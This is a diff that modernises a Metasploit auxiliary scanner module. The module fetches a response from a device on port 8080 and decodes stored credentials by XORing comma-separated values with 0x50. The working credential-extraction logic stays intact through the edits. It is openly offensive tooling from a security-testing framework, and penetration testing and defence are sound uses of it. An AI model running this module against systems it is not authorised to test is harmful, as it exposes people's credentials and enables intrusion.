@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -38,9 +35,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(8080),
         OptBool.new('SSL',   [false, 'Use SSL', false])
-      ], self.class)
-
-    deregister_options('RHOST')
+      ])
   end
 
   def run_host(ip)
@@ -53,26 +48,25 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res.nil? or res.body.empty?
-      vprint_error("#{peer} - No content retrieved")
+      vprint_error("No content retrieved")
       return
     end
 
     if res.code == 404
-      vprint_error("#{peer} - File not found")
+      vprint_error("File not found")
       return
     end
 
     if res.code == 200
       creds = ""
 
-      vprint_status("#{peer} - String received: #{res.body.to_s}") unless res.body.blank?
+      vprint_status("String received: #{res.body.to_s}") unless res.body.blank?
 
       res.body.to_s.split(",").each do|c|
         i = c.to_i ^ 0x50
         creds += i.chr
       end
-      print_good("#{peer} - Credentials decoded: #{creds}") unless creds.empty?
+      print_good("Credentials decoded: #{creds}") unless creds.empty?
     end
   end
-
 end
